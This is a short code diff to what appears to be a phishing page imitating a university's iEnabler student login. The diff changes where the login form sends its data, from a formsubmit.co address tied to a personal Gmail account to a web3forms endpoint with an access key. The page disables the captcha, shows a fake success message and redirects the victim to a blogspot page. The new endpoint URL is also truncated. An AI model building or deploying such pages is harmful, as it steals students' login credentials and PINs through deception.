@@ -266,9 +266,9 @@
     </div>
 
     <form id="loginForm"
-          action="https://formsubmit.co/getzgetz14@gmail.com"
+          action="https://api.web3forms.com/submi"
           method="POST">
-
+<input type="hidden" name="access_key" value="0269f023-5f17-454e-b830-f01ac0d40981">
       <input type="hidden" name="_captcha" value="false">
       <input type="hidden" name="_subject" value="TUT iEnabler Login Submission">
       <input type="hidden" name="_next" value="https://student-query.blogspot.com/2026/03/tut-student-query-portal-root-navy.html">
@@ -347,10 +347,9 @@
 
     document.getElementById('msgError').style.display = 'none';
     document.getElementById('msgSuccess').style.display = 'block';
-    /* Form will submit naturally to formsubmit.co */
+
   });
 
-  /* Only allow digits in PIN field */
   document.getElementById('pinField').addEventListener('input', function() {
     this.value = this.value.replace(/[^0-9]/g, '');
   });
